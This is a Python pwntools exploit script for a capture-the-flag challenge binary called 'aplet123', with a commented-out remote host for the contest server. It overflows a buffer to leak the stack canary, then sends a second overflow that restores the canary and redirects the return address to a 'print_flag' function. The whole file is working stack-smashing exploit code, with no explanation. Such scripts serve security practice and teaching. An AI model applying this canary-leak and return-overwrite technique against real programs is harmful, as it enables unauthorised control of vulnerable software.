#!/bin/python
from pwn import *
exe = ELF('./aplet123')
p = process(exe.path)
# p = remote('chall.lac.tf',31123 )
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''
# # b*main+82
#            b*main+146
#
#            ''')
#################exploiting#####################

payload = b'a'*0x3e + b'a'*0x7
payload += b'i\'m'
p.sendlineafter(b'hello\n',payload)
p.recvuntil(b'hi ')
canary_leak = u64(p.recv(7) + b'\x00')
payload = b'a'*0x48
payload += p8(0)
payload += p64(canary_leak)
payload += b'a'*0x7
payload += p64(exe.sym['print_flag'])
p.sendlineafter(b'aplet123\n',payload)
# payload = b'a'*0x40







##############the end###########################
p.interactive()
